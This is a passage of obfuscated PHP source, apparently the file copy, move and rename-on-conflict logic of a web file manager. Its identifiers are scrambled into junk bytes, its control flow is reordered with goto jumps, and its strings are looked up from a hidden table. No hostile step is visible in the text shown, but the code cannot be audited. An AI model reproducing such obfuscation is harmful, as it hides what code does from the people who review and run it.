Ş =& $_SERVER[Ïº«‚ßèÔˆø]; $d¼…†•å£ö = $this->sourceInfo($AÛÓÂ”ô—); $a”ÂíÏëÆº = $this->sourceInfo($B¤âíœÎ¹Ã); goto b„˜¤Ù‘â; BèÑÑ÷¥Í: $this->updateModifyTime($B¤âíœÎ¹Ã); return $BÆ–“Åµ; goto DóÖù“šã; Cœ£†ÁŞÆ„: $this->saveAll($aˆÛ’äÅ¶[$b‹’ñ‹ Ş[530]]); Model($b‹’ñ‹ Ş[192])->linkAdd($aˆÛ’äÅ¶[$b‹’ñ‹ Ş[528]]); $this->folderSizeReset($B¤âíœÎ¹Ã); goto BèÑÑ÷¥Í; E±Èİù•Ø¤: $this->_childrenListClear(); $this->lockCopyEnd($AÛÓÂ”ô—); $this->lockWriteEnd($B¤âíœÎ¹Ã, $C†ÃÅöÂ¸‚); goto F¬ŞÕáÅÃÂ; aŒÄÑ¬‹å¹: $this->targetIsDelete = intval($d¼…†•å£ö[$b‹’ñ‹ Ş[421]]); $eëåßë›© = $this->fileNameExistCache($B¤âíœÎ¹Ã, $d¼…†•å£ö[$b‹’ñ‹ Ş[28]]); $BÆ–“Åµ = $this->_copy($AÛÓÂ”ô—, $B¤âíœÎ¹Ã, $dœœ¢¼¾ÅÃ, $aˆÛ’äÅ¶, !0, $E‰ô‹Ã„§¬); goto E±Èİù•Ø¤; DóÖù“šã: } private function _copy($E§†Æ¤Ã¥ò, $e…ŒäÇ¬…, $Aˆ”åù”Ìø, &$aÄ×ÍÕŞİ½, $fÒìá¡•ë, $f°ŒÃ‹¾Úè = '') { goto FËéƒ–òâë; f®éö£ÏÌ: if (!$AËÍŞóîÈç) { return $this->_copyCreate($E§†Æ¤Ã¥ò, $e…ŒäÇ¬…, $DÚ‘‰óïÊß, $aÄ×ÍÕŞİ½); } $B•¾‚µÙñ = $AËÍŞóîÈç; if ($f‡³¬ë¨Ó) { if ($Aˆ”åù”Ìø == REPEAT_RENAME_FOLDER) { $DÚ‘‰óïÊß = $this->fileNameAutoCache($e…ŒäÇ¬…, $DÚ‘‰óïÊß, $Aˆ”åù”Ìø, $f‡³¬ë¨Ó); $B•¾‚µÙñ = $this->_copyCreate($E§†Æ¤Ã¥ò, $e…ŒäÇ¬…, $DÚ‘‰óïÊß, $aÄ×ÍÕŞİ½); } else { $E‰Ò»î¯´¸ = $this->_childrenList($E§†Æ¤Ã¥ò); foreach ($E‰Ò»î¯´¸ as $B÷¢í–ÉÓ…) { $this->_copy($B÷¢í–ÉÓ…[$dôÃ™É†Ù[394]], $AËÍŞóîÈç, $Aˆ”åù”Ìø, $aÄ×ÍÕŞİ½, !1); } } } else { if ($Aˆ”åù”Ìø == REPEAT_RENAME || $Aˆ”åù”Ìø == REPEAT_RENAME_FOLDER) { $DÚ‘‰óïÊß = $this->fileNameAutoCache($e…ŒäÇ¬…, $DÚ‘‰óïÊß, $Aˆ”åù”Ìø, $f‡³¬ë¨Ó); $B•¾‚µÙñ = $this->_copyCreate($E§†Æ¤Ã¥ò, $e…ŒäÇ¬…, $DÚ‘‰óïÊß, $aÄ×ÍÕŞİ½); } else { if ($Aˆ”åù”Ìø == REPEAT_REPLACE) { $c˜‡ğÌìë• = $this->sourceInfoCache($AËÍŞóîÈç); $E×Ú´Èßéº = $this->fileHistory($c˜‡ğÌìë•, $FÏ¯Õ˜‰[$dôÃ™É†Ù[445]], $FÏ¯Õ˜‰[$dôÃ™É†Ù[78]]); if ($E×Ú´Èßéº) { $aÄ×ÍÕŞİ½[$dôÃ™É†Ù[528]][] = $FÏ¯Õ˜‰[$dôÃ™É†Ù[445]]; } } else { if ($Aˆ”åù”Ìø == REPEAT_SKIP) { } } } Hook::trigger($dôÃ™É†Ù[533], array($dôÃ™É†Ù[534], $FÏ¯Õ˜‰, 0)); } goto dæ¼Ÿ¢¸˜½; B¸Ş£Ñ¾Ã: $DÚ‘‰óïÊß = $f°ŒÃ‹¾Úè ? $f°ŒÃ‹¾Úè : $FÏ¯Õ˜‰[$dôÃ™É†Ù[28]]; $AËÍŞóîÈç = $this->fileNameExistCache($e…ŒäÇ¬…, $DÚ‘‰óïÊß); if ($fÒìá¡•ë) { $this->_childrenAllMake($E§†Æ¤Ã¥ò); if ($f‡³¬ë¨Ó && $AËÍŞóîÈç) { $this->_childrenAllMake($AËÍŞóîÈç); } } goto f®éö£ÏÌ; FËéƒ–òâë: $dôÃ™É†Ù =& $_SERVER[Ïº«‚ßèÔˆø]; $FÏ¯Õ˜‰ = $this->sourceInfoCache($E§†Æ¤Ã¥ò); $f‡³¬ë¨Ó = $FÏ¯Õ˜‰[$dôÃ™É†Ù[401]] == $dôÃ™É†Ù[87]; goto B¸Ş£Ñ¾Ã; dæ¼Ÿ¢¸˜½: return $B•¾‚µÙñ; goto d´ô›²ò¶í; d´ô›²ò¶í: } private function _copyCreate($e„ŠÉøº¼£, $bê‘·ôö‡, $FÁ°§ì‚÷œ, &$EÓ²˜Ç½î) { goto f…çµó½†±; dÂÃ“‘¢¾ù: if ($c¸ËÛÄˆ÷Œ[$eŒÀøæ˜‘Å[401]] != $eŒÀøæ˜‘Å[87]) { $EÓ²˜Ç½î[$eŒÀøæ˜‘Å[528]][] = $c¸ËÛÄˆ÷Œ[$eŒÀøæ˜‘Å[445]]; return $bã“Ï÷³½³; } $FÆÃ¶»Œ™ = array(); $EÍÒ¤õ³ = array(); goto E¥Õ—ä£ø‰; f…çµó½†±: $eŒÀøæ˜‘Å =& $_SERVER[Ïº«‚ßèÔˆø]; $c¸ËÛÄˆ÷Œ = $this->sourceInfoCache($e„ŠÉøº¼£); $b°Á˜×™ºĞ = $this->sourceInfoCache($bê‘·ôö‡); goto aÏ÷ğª¶ÈÚ; A˜ãİŠÏÇñ: $this->chunkEventSet($eŒÀøæ˜‘Å[542], array($eŒÀøæ˜‘Å[543], $cïØóØŒ, $c¦Ü¢…†­)); $this->saveAll($d¹Ü–¤œ¡Ñ); return $bã“Ï÷³½³; goto dŞßëªÈ…; Aåù‘ ¢ó”: $this->addAll($EÍÒ¤õ³, array(), !1); $dõ½œíºœİ = $this->where(array($eŒÀøæ˜‘Å[476] => $bã“Ï÷³½³))->select(); $bÎÏĞå²´ = $this->_childrenMakeRelation($FÆÃ¶»Œ™, $dõ½œíºœİ); goto a¬¿ê‘Ë»‘; b‡´æ”ƒ³„: $bã“Ï÷³½³ = $this->add($cïØóØŒ); $a“İ„¦† = array($eŒÀøæ˜‘Å[394] => $bã“Ï÷³½³, $eŒÀøæ˜‘Å[28] => $FÁ°§ì‚÷œ); $this->_copyApplyMeta($a“İ„¦†, $EÓ²˜Ç½î); goto dÂÃ“‘¢¾ù; aÏ÷ğª¶ÈÚ: $cïØóØŒ = $this->_makeItemData($c¸ËÛÄˆ÷Œ, $b°Á˜×™ºĞ, $FÁ°§ì‚÷œ); Hook::trigger($eŒÀøæ˜‘Å[535], $cïØóØŒ); Hook::trigger($eŒÀøæ˜‘Å[536], array($eŒÀøæ˜‘Å[537], $cïØóØŒ, 0)); goto b‡´æ”ƒ³„; a¬¿ê‘Ë»‘: $bÎÏĞå²´[$e„ŠÉøº¼£] = $bã“Ï÷³½³; $aÔö¹³†œ® = array(); $d¹Ü–¤œ¡Ñ = array(); goto eæìÙËç´; eæìÙËç´: foreach ($dõ½œíºœİ as $dã–éÑáŠÜ) { $AóºÌĞ±Ì­ = $dã–éÑáŠÜ[$eŒÀøæ˜‘Å[394]]; $a»ÙÃóÁ… = $this->_childrenMatch($bÎÏĞå²´, $dã–éÑáŠÜ, $E¼¼¿åºÍÂ); $aÔö¹³†œ®[] = array($eŒÀøæ˜‘Å[394], $AóºÌĞ±Ì­, $eŒÀøæ˜‘Å[476], $a»ÙÃóÁ…[$eŒÀøæ˜‘Å[476]]); $d¹Ü–¤œ¡Ñ[] = array($eŒÀøæ˜‘Å[394], $AóºÌĞ±Ì­, $eŒÀøæ˜‘Å[485], $a»ÙÃóÁ…[$eŒÀøæ˜‘Å[485]]); $this->_copyApplyMeta($dã–éÑáŠÜ, $EÓ²˜Ç½î); if ($dã–éÑáŠÜ[$eŒÀøæ˜‘Å[401]] != $eŒÀøæ˜‘Å[87]) { $EÓ²˜Ç½î[$eŒÀøæ˜‘Å[528]][] = $dã–éÑáŠÜ[$eŒÀøæ˜‘Å[445]]; } } $this->chunkEventSet($eŒÀøæ˜‘Å[540], array($eŒÀøæ˜‘Å[541], $cïØóØŒ, $c¦Ü¢…†­)); $this->saveAll($aÔö¹³†œ®); goto A˜ãİŠÏÇñ; E¥Õ—ä£ø‰: $this->_childrenListAll($e„ŠÉøº¼£, $FÆÃ¶»Œ™); $c¦Ü¢…†­ = count($FÆÃ¶»Œ™); if ($c¦Ü¢…†­ == 0) { return $bã“Ï÷³½³; } goto Cã³‘Íª¡„; Cã³‘Íª¡„: $E¼¼¿åºÍÂ = $this->sourceInfo($bã“Ï÷³½³); foreach ($FÆÃ¶»Œ™ as $dã–éÑáŠÜ) { $b÷¾•‰ÒÔ = $this->_makeItemData($dã–éÑáŠÜ, $E¼¼¿åºÍÂ, $dã–éÑáŠÜ[$eŒÀøæ˜‘Å[28]]); $b÷¾•‰ÒÔ[$eŒÀøæ˜‘Å[485]] = $dã–éÑáŠÜ[$eŒÀøæ˜‘Å[485]]; $EÍÒ¤õ³[] = $b÷¾•‰ÒÔ; } $this->chunkEventSet($eŒÀøæ˜‘Å[538], array($eŒÀøæ˜‘Å[539], $cïØóØŒ, $c¦Ü¢…†­)); goto Aåù‘ ¢ó”; dŞßëªÈ…: } private function _childrenMakeRelation($A½“à×É§—, $cªÊÍ´ß¿å) { $DÛ»½·¦Ò² =& $_SERVER[Ïº«‚ßèÔˆø]; $DÁ¹–ÚÑÔ¬ = array(); $DŠ×£Ç¼Ô‹ = array(); foreach ($A½“à×É§— as $dŒà±©àö‡) { $CçÖÙò‘¦ = $dŒà±©àö‡[$DÛ»½·¦Ò²[28]] . $DÛ»½·¦Ò²[8] . $dŒà±©àö‡[$DÛ»½·¦Ò²[485]]; $DÁ¹–ÚÑÔ¬[$CçÖÙò‘¦] = $dŒà±©àö‡[$DÛ»½·¦Ò²[394]]; } foreach ($cªÊÍ´ß¿å as $dŒà±©àö‡) { $CçÖÙò‘¦ = $dŒà±©àö‡[$DÛ»½·¦Ò²[28]] . $DÛ»½·¦Ò²[8] . $dŒà±©àö‡[$DÛ»½·¦Ò²[485]]; $F¶‰¸¿ŠÎ = $DÁ¹–ÚÑÔ¬[$CçÖÙò‘¦]; $DŠ×£Ç¼Ô‹[$F¶‰¸¿ŠÎ] = $dŒà±©àö‡[$DÛ»½·¦Ò²[394]]; } return $DŠ×£Ç¼Ô‹; } private function _childrenMatch($EŠŸ”¯„ˆÊ, $FÒãÓ…¨†Ş, $D©ÎßÏ³·) { goto c¹š’Š×´ğ; cÈê†õÎº™: foreach ($Eñ¯—´¤Œ° as $B¨¤Œ£¸¼) { if (isset($EŠŸ”¯„ˆÊ[$B¨¤Œ£¸¼])) { $Fˆ¿ÛÊ…çŸ .= $EŠŸ”¯„ˆÊ[$B¨¤Œ£¸¼] . $dÔÃŞ“ —[544]; } } $Fˆ¿ÛÊ…çŸ = rtrim($Fˆ¿ÛÊ…çŸ, $dÔÃŞ“ —[47]) . $dÔÃŞ“ —[47]; $a¡µöİìË­ = $this->parentLevelArray($Fˆ¿ÛÊ…çŸ); goto E›ªÓµáæÇ; E›ªÓµáæÇ: $CŒËÒ»“ÃÒ = $a¡µöİìË­[count($a¡µöİìË­) - 1]; return array($dÔÃŞ“ —[476] => $CŒËÒ»“ÃÒ, $dÔÃŞ“ —[485] => $Fˆ¿ÛÊ…çŸ); goto D£¨£ç•İ; c¹š’Š×´ğ: $dÔÃŞ“ — =& $_SERVER[Ïº«‚ßèÔˆø]; $Fˆ¿ÛÊ…çŸ = $D©ÎßÏ³·[$dÔÃŞ“ —[485]]; $Eñ¯—´¤Œ° = $this->parentLevelArray($FÒãÓ…¨†Ş[$dÔÃŞ“ —[485]]); goto cÈê†õÎº™; D£¨£ç•İ: } private function _makeItemData($EÑŠÅ¶‹ …, $FÚ¢ç×ñ¥Á, $Cù¬Å†¼ĞŞ) { $cáÜğË =& $_SERVER[Ïº«‚ßèÔˆø]; $cÑ½ŠŠà = array($cáÜğË[545] => $EÑŠÅ¶‹ …[$cáÜğË[401]], $cáÜğË[411] => $Cù¬Å†¼ĞŞ, $cáÜğË[546] => $EÑŠÅ¶‹ …[$cáÜğË[403]], $cáÜğË[446] => $EÑŠÅ¶‹ …[$cáÜğË[445]], $cáÜğË[547] => $EÑŠÅ¶‹ …[$cáÜğË[78]], $cáÜğË[548] => $FÚ¢ç×ñ¥Á[$cáÜğË[402]], $cáÜğË[549] => $FÚ¢ç×ñ¥Á[$cáÜğË[482]], $cáÜğË[550] => USER_ID, $cáÜğË[551] => USER_ID, $cáÜğË[393] => $FÚ¢ç×ñ¥Á[$cáÜğË[394]], $cáÜğË[552] => $FÚ¢ç×ñ¥Á[$cáÜğË[485]] . $FÚ¢ç×ñ¥Á[$cáÜğË[394]] . $cáÜğË[47], $cáÜğË[415] => $EÑŠÅ¶‹ …[$cáÜğË[84]], $cáÜğË[420] => 0, $cáÜğË[553] => $cáÜğË[33]); return $cÑ½ŠŠà; } private function _copyApplyMeta($B³°­©‹¶é, &$A–ËÆÎä) { $b†ÖÒÇâ =& $_SERVER[Ïº«‚ßèÔˆø]; $c‰ê›ºõ¶ = $B³°­©‹¶é[$b†ÖÒÇâ[394]]; $añ³´±‚İ³ = $B³°­©‹¶é[$b†ÖÒÇâ[28]]; if (!isset($B³°­©‹¶é[$b†ÖÒÇâ[554]]) || !$B³°­©‹¶é[$b†ÖÒÇâ[554]] || $B³°­©‹¶é[$b†ÖÒÇâ[554]] == $b†ÖÒÇâ[495]) { $A–ËÆÎä[$b†ÖÒÇâ[530]][] = array($b†ÖÒÇâ[394], $c‰ê›ºõ¶, $b†ÖÒÇâ[554], short_id($c‰ê›ºõ¶)); } if (Input::check($añ³´±‚İ³, $b†ÖÒÇâ[555])) { $A–ËÆÎä[$b†ÖÒÇâ[529]][] = array($b†ÖÒÇâ[394] => $c‰ê›ºõ¶, $b†ÖÒÇâ[93] => $b†ÖÒÇâ[442], $b†ÖÒÇâ[371] => str_replace($b†ÖÒÇâ[50], $b†ÖÒÇâ[33], Pinyin::encode($añ³´±‚İ³))); $A–ËÆÎä[$b†ÖÒÇâ[529]][] = array($b†ÖÒÇâ[394] => $c‰ê›ºõ¶, $b†ÖÒÇâ[93] => $b†ÖÒÇâ[441], $b†ÖÒÇâ[371] => Pinyin::encode($añ³´±‚İ³, $b†ÖÒÇâ[556])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Fä·•˜”) { goto eÇëµ²×£Ù; eÇëµ²×£Ù: $eí¿òôÓ¸¶ =& $_SERVER[Ïº«‚ßèÔˆø]; $b¤ôæ¼İö· = $this->sourceInfo($Fä·•˜”); $aËì·£Õç¾ = $eí¿òôÓ¸¶[422]; goto cîçŠ°¬â; cîçŠ°¬â: $eÃŒ†Ø¼¬ = array($eí¿òôÓ¸¶[485] => array($eí¿òôÓ¸¶[511], $b¤ôæ¼İö·[$eí¿òôÓ¸¶[485]] . $Fä·•˜” . $eí¿òôÓ¸¶[512]), $eí¿òôÓ¸¶[421] => $this->targetIsDelete); $D…¯ƒÜ®µ = $this->field($aËì·£Õç¾)->where($eÃŒ†Ø¼¬)->select(); if (!$D…¯ƒÜ®µ) { return; } goto e¶ƒ¸ªÀ°; e¶ƒ¸ªÀ°: $D…¯ƒÜ®µ = array_to_keyvalue($D…¯ƒÜ®µ, $eí¿òôÓ¸¶[394]); foreach ($D…¯ƒÜ®µ as $bóÜÔƒ¯Š¯) { $eòÙ±ÆÛ¯£ = $bóÜÔƒ¯Š¯[$eí¿òôÓ¸¶[476]]; $Fä·•˜” = $bóÜÔƒ¯Š¯[$eí¿òôÓ¸¶[394]]; if (!isset($this->_childrenListCache[$Fä·•˜”]) && $bóÜÔƒ¯Š¯[$eí¿òôÓ¸¶[401]] == $eí¿òôÓ¸¶[87]) { $this->_childrenListCache[$Fä·•˜”] = array(); } if (!isset($this->_childrenListCache[$eòÙ±ÆÛ¯£])) { $this->_childrenListCache[$eòÙ±ÆÛ¯£] = array(); } $this->_childrenListCache[$eòÙ±ÆÛ¯£][$Fä·•˜”] = $bóÜÔƒ¯Š¯; $this->_childrenItemCache[$Fä·•˜”] = $bóÜÔƒ¯Š¯; } goto DÓŠâà¹«õ; DÓŠâà¹«õ: } private function _childrenListAll($c¬ù¾Ç¢ ë, &$C½ê‹š¨¢¬) { $eÖ¯š¦Î¦¸ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($this->_childrenListCache[$c¬ù¾Ç¢ ë])) { return; } $Bî˜×·šÃ = $this->_childrenListCache[$c¬ù¾Ç¢ ë]; foreach ($Bî˜×·šÃ as $b¸š°·ƒÜ“ => $FéÍù©ƒ) { $C½ê‹š¨¢¬[$b¸š°·ƒÜ“] = $FéÍù©ƒ; if ($FéÍù©ƒ[$eÖ¯š¦Î¦¸[401]] == $eÖ¯š¦Î¦¸[87]) { $this->_childrenListAll($b¸š°·ƒÜ“, $C½ê‹š¨¢¬); } } } private function sourceInfoCache($AŠÎ‰Ç²Ò) { if (isset($this->_childrenItemCache[$AŠÎ‰Ç²Ò])) { return $this->_childrenItemCache[$AŠÎ‰Ç²Ò]; } return $this->sourceInfo($AŠÎ‰Ç²Ò); } private function _childrenList($Eèåõ™—) { if (isset($this->_childrenListCache[$Eèåõ™—])) { return $this->_childrenListCache[$Eèåõ™—]; } return $this->_childrenListSelect($Eèåõ™—); } private function _childrenListSelect($F ÙÔ…™â) { goto e‹©¤±İƒ; böåÇÅ‚·Ÿ: $c¦Õî…³§Ş = $c¦Õî…³§Ş ? $c¦Õî…³§Ş : array(); $C‡—†äÑÖ® = array_to_keyvalue($c¦Õî…³§Ş, $C”õ¤Ä¦…¶[394]); $this->_childrenListCache[$F ÙÔ…™â] = $C‡—†äÑÖ®; goto a¬‹ù‡’¢; a¬‹ù‡’¢: foreach ($C‡—†äÑÖ® as $F ÙÔ…™â => $a”‹ŠÑ‡„ò) { $this->_childrenItemCache[$F ÙÔ…™â] = $a”‹ŠÑ‡„ò; } return $C‡—†äÑÖ®; goto eÍÛ¬²»Ñç; e‹©¤±İƒ: $C”õ¤Ä¦…¶ =& $_SERVER[Ïº«‚ßèÔˆø]; $e‰³‡Œ¯ŞÖ = array($C”õ¤Ä¦…¶[476] => $F ÙÔ…™â, $C”õ¤Ä¦…¶[421] => $this->targetIsDelete); $c¦Õî…³§Ş = $this->where($e‰³‡Œ¯ŞÖ)->select(); goto böåÇÅ‚·Ÿ; eÍÛ¬²»Ñç: } private function fileNameExistCache($b®®À†®¹ó, $b©“Ù¶’˜Ó) { $dß±¸‹’Í÷ =& $_SERVER[Ïº«‚ßèÔˆø]; $b©“Ù¶’˜Ó = strtolower($b©“Ù¶’˜Ó); $bäê¨÷Óµ = $this->_childrenList($b®®À†®¹ó); foreach ($bäê¨÷Óµ as $D‰Å–›Öî¯) { if ($b©“Ù¶’˜Ó == strtolower($D‰Å–›Öî¯[$dß±¸‹’Í÷[28]])) { return $D‰Å–›Öî¯[$dß±¸‹’Í÷[394]]; } } return !1; } private function fileNameAutoCache($bëƒçõµ÷, $B¶•ØÎ‡õ, $Bï…È¬Öƒ“, $DÊ…Èö„«–) { $a¸”©Ğš¹è =& $_SERVER[Ïº«‚ßèÔˆø]; $DÃ—¿ğäØß = $this->_childrenList($bëƒçõµ÷); $EïÅõé²Û¤ = array_to_keyvalue($DÃ—¿ğäØß, $a¸”©Ğš¹è[33], $a¸”©Ğš¹è[28]); return $this->fileNameAutoGet($EïÅõé²Û¤, $B¶•ØÎ‡õ, $Bï…È¬Öƒ“, $DÊ…Èö„«–); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($e•ƒ†Ÿç«, $fóê®™ë¼´, $C ¹¹ƒĞ¾ = REPEAT_REPLACE, $d„¨È²”¬ = '') { goto Eé¶Æ½ºƒ; Eé¶Æ½ºƒ: $EÂèŸÉòšë =& $_SERVER[Ïº«‚ßèÔˆø]; $E¸‚®šÓ¸ß = $this->sourceInfo($e•ƒ†Ÿç«); $BŠƒˆÑÈÊè = $this->sourceInfo($fóê®™ë¼´); goto EªíÄ”Ä¦; EªíÄ”Ä¦: if ($E¸‚®šÓ¸ß[$EÂèŸÉòšë[476]] == $BŠƒˆÑÈÊè[$EÂèŸÉòšë[394]]) { if ($E¸‚®šÓ¸ß[$EÂèŸÉòšë[421]] == $EÂèŸÉòšë[87]) { Model($EÂèŸÉòšë[419])->restore(array($e•ƒ†Ÿç«)); } if (!$d„¨È²”¬ || $d„¨È²”¬ == $E¸‚®šÓ¸ß[$EÂèŸÉòšë[28]]) { return $e•ƒ†Ÿç«; } } $cì‰Ö—½á = $this->pathInfoMore($e•ƒ†Ÿç«); if ($this->isParentOf($e•ƒ†Ÿç«, $fóê®™ë¼´)) { return !1; } goto B±¥èÎ¥Ùò; eÈ×İœÆö: $this->lockWriteStart($fóê®™ë¼´, $fÚ‰ …¬Æ); $d®¸‡±éô = array($EÂèŸÉòšë[528] => array(), $EÂèŸÉòšë[559] => !1); $this->clearShare($e•ƒ†Ÿç«, $fóê®™ë¼´); goto A¾ùîŒŒÀ—; Dôî³‰æÖì: $this->updateModifyTime($bÌ±¸íø†Ô); Model($EÂèŸÉòšë[532])->eventMove($e•ƒ†Ÿç«, $E¸‚®šÓ¸ß[$EÂèŸÉòšë[476]], $fóê®™ë¼´); Hook::trigger($EÂèŸÉòšë[558], $cì‰Ö—½á); goto eŠÛ½ñ×¿; eŠÛ½ñ×¿: return $Fî§‚–”è°; goto AÚ¥Ø´Ğ¤ñ; A¾ùîŒŒÀ—: $Båë«ÌˆÇ· = $this->fileNameExistCache($fóê®™ë¼´, $E¸‚®šÓ¸ß[$EÂèŸÉòšë[28]]); $Fî§‚–”è° = $this->_move($e•ƒ†Ÿç«, $fóê®™ë¼´, $C ¹¹ƒĞ¾, $d®¸‡±éô, $d„¨È²”¬); $this->sourceCacheClear(); goto A«‰±„÷¼ƒ; B±¥èÎ¥Ùò: if (!$E¸‚®šÓ¸ß || !$BŠƒˆÑÈÊè || $BŠƒˆÑÈÊè[$EÂèŸÉòšë[401]] != $EÂèŸÉòšë[87]) { return !1; } Hook::trigger($EÂèŸÉòšë[557], $cì‰Ö—½á); $this->targetIsDelete = intval($E¸‚®šÓ¸ß[$EÂèŸÉòšë[421]]); goto aÔÑë¡Æ‘£; bŠó›ÈªŞÍ: $this->lockMoveEnd($e•ƒ†Ÿç«); $this->lockWriteEnd($fóê®™ë¼´, $fÚ‰ …¬Æ); $this->folderSizeReset($E¸‚®šÓ¸ß[$EÂèŸÉòšë[476]]); goto b‹ù»Ÿ¶ßâ; aÔÑë¡Æ‘£: if ($E¸‚®šÓ¸ß[$EÂèŸÉòšë[476]] == $fóê®™ë¼´ && $d„¨È²”¬ != $E¸‚®šÓ¸ß[$EÂèŸÉòšë[28]]) { $FÈœ‡¯ = $this->fileNameExist($fóê®™ë¼´, $d„¨È²”¬); if ($FÈœ‡¯ && $E¸‚®šÓ¸ß[$EÂèŸÉòšë[401]] == $EÂèŸÉòšë[495]) { goto CÁî¬§ÔŞÛ; bŸŒ¡‘¸ ö: $this->removeNow($e•ƒ†Ÿç«, !1); $this->folderSizeReset($fóê®™ë¼´); Hook::trigger($EÂèŸÉòšë[558], $cì‰Ö—½á); goto fš¾ï±ãÍ; CÁî¬§ÔŞÛ: $aœ‚™‡—É¯ = $this->sourceInfo($FÈœ‡¯); $cÁ°…åÊ¬ = $this->fileHistory($aœ‚™‡—É¯, $E¸‚®šÓ¸ß[$EÂèŸÉòšë[445]], $E¸‚®šÓ¸ß[$EÂèŸÉòšë[78]]); if (!$cÁ°…åÊ¬) { Model($EÂèŸÉòšë[448])->remove($E¸‚®šÓ¸ß[$EÂèŸÉòšë[445]]); } goto bŸŒ¡‘¸ ö; fš¾ï±ãÍ: return $FÈœ‡¯; goto Aí¡±Ç–Ã¸; Aí¡±Ç–Ã¸: } } $fÚ‰ …¬Æ = $d„¨È²”¬ ? $d„¨È²”¬ : $E¸‚®šÓ¸ß[$EÂèŸÉòšë[28]]; $this->lockMoveStart($e•ƒ†Ÿç«); goto eÈ×İœÆö; b‹ù»Ÿ¶ßâ: $this->folderSizeReset($fóê®™ë¼´); $bÌ±¸íø†Ô = array($E¸‚®šÓ¸ß[$EÂèŸÉòšë[476]], $fóê®™ë¼´); if ($E¸‚®šÓ¸ß[$EÂèŸÉòšë[401]] == $EÂèŸÉòšë[87]) { $bÌ±¸íø†Ô[] = $e•ƒ†Ÿç«; } goto Dôî³‰æÖì; A«‰±„÷¼ƒ: if ($E¸‚®šÓ¸ß[$EÂèŸÉòšë[401]] == $EÂèŸÉòšë[87] && $Båë«ÌˆÇ·) { $this->folderSizeResetChildren($Fî§‚–”è°); } Model($EÂèŸÉòšë[192])->linkAdd($d®¸‡±éô[$EÂèŸÉòšë[528]]); if ($Båë«ÌˆÇ· && $d®¸‡±éô[$EÂèŸÉòšë[559]]) { $this->removeNow($e•ƒ†Ÿç«, !1); } goto bŠó›ÈªŞÍ; AÚ¥Ø´Ğ¤ñ: } private function _move($fŞŒÆÂ¯Ï‹, $c‡äíÚÃøÑ, $BÌ­ÛªùÏ­, &$Câ™‰Ñ…‘±, $D›“ì®­ = '') { goto AŒ·“ŒóÆ÷; Cî™©µ‰ØÆ: return $E°‘¶ÚåÏ; goto fïÓƒâ‹Î; eŸ•Òšª¡„: $eßØÀÖù = !1; if ($fô˜›ŒİƒÓ) { if ($BÌ­ÛªùÏ­ == REPEAT_RENAME_FOLDER) { $E¡ˆÑÍõ˜ = $this->fileNameAuto($c‡äíÚÃøÑ, $E¡ˆÑÍõ˜, $BÌ­ÛªùÏ­, $fô˜›ŒİƒÓ); $E°‘¶ÚåÏ = $this->_moveForce($fŞŒÆÂ¯Ï‹, $c‡äíÚÃøÑ, $E¡ˆÑÍõ˜); } else { if ($BÌ­ÛªùÏ­ == REPEAT_RENAME_FOLDER) { $BÌ­ÛªùÏ­ = REPEAT_RENAME; } $B„‚´÷Â—… = $this->_childrenListSelect($fŞŒÆÂ¯Ï‹); foreach ($B„‚´÷Â—… as $BÕéŸï¶Î) { $this->_move($BÕéŸï¶Î[$bÔçØ“êñ[394]], $a¼¥·îœ¬¿, $BÌ­ÛªùÏ­, $Câ™‰Ñ…‘±); } $eßØÀÖù = !0; } } else { if ($BÌ­ÛªùÏ­ == REPEAT_SKIP) { $eßØÀÖù = !0; } else { if ($BÌ­ÛªùÏ­ == REPEAT_RENAME || $BÌ­ÛªùÏ­ == REPEAT_RENAME_FOLDER) { $E¡ˆÑÍõ˜ = $this->fileNameAuto($c‡äíÚÃøÑ, $E¡ˆÑÍõ˜, $BÌ­ÛªùÏ­, $fô˜›ŒİƒÓ); $E°‘¶ÚåÏ = $this->_moveForce($fŞŒÆÂ¯Ï‹, $c‡äíÚÃøÑ, $E¡ˆÑÍõ˜); } else { if ($BÌ­ÛªùÏ­ == REPEAT_REPLACE) { $CÔÙ»®ºÅÑ = $this->sourceInfoCache($a¼¥·îœ¬¿); $E°‚ö’·§ = $this->fileHistory($CÔÙ»®ºÅÑ, $a´†¡‰ªŒî[$bÔçØ“êñ[445]], $a´†¡‰ªŒî[$bÔçØ“êñ[78]]); if ($E°‚ö’·§) { $Câ™‰Ñ…‘±[$bÔçØ“êñ[528]][] = $a´†¡‰ªŒî[$bÔçØ“êñ[445]]; } else { $eßØÀÖù = !0; } } } } } if ($eßØÀÖù && !$Câ™‰Ñ…‘±[$bÔçØ“êñ[559]]) { $Câ™‰Ñ…‘±[$bÔçØ“êñ[559]] = !0; } goto Cî™©µ‰ØÆ; AŒ·“ŒóÆ÷: $bÔçØ“êñ =& $_SERVER[Ïº«‚ßèÔˆø]; $a´†¡‰ªŒî = $this->sourceInfo($fŞŒÆÂ¯Ï‹); $fô˜›ŒİƒÓ = $a´†¡‰ªŒî[$bÔçØ“êñ[401]] == $bÔçØ“êñ[87]; goto e‘Ÿ‹Ø¦—¸; AßÛš…¹ø‹: $this->lockWriteStart($c‡äíÚÃøÑ, $E¡ˆÑÍõ˜); if (!$a¼¥·îœ¬¿) { return $this->_moveForce($fŞŒÆÂ¯Ï‹, $c‡äíÚÃøÑ, $E¡ˆÑÍõ˜); } $E°‘¶ÚåÏ = $a¼¥·îœ¬¿; goto eŸ•Òšª¡„; e‘Ÿ‹Ø¦—¸: $E¡ˆÑÍõ˜ = $D›“ì®­ ? $D›“ì®­ : $a´†¡‰ªŒî[$bÔçØ“êñ[28]]; $a¼¥·îœ¬¿ = $this->fileNameExistCache($c‡äíÚÃøÑ, $E¡ˆÑÍõ˜); $this->lockMoveStart($fŞŒÆÂ¯Ï‹); goto AßÛš…¹ø‹; fïÓƒâ‹Î: } private function _moveForce($Eã…¿î ìÛ, $d¿‡à³Çà, $F»ô’ÉŠË¸) { goto fÇ¨Š†§·‹; e°‹Û„á³š: $f–Âæí©ƒÒ = $BÈô³ª¡Éî[$BĞßÅ˜ÂÜ·[401]] == $BĞßÅ˜ÂÜ·[87]; $bĞŸ¦¹´´› = array($BĞßÅ˜ÂÜ·[393] => $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[394]], $BĞßÅ˜ÂÜ·[552] => $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[485]] . $D©éÏÚ©ÅÑ[$BĞßÅ˜ÂÜ·[394]] . 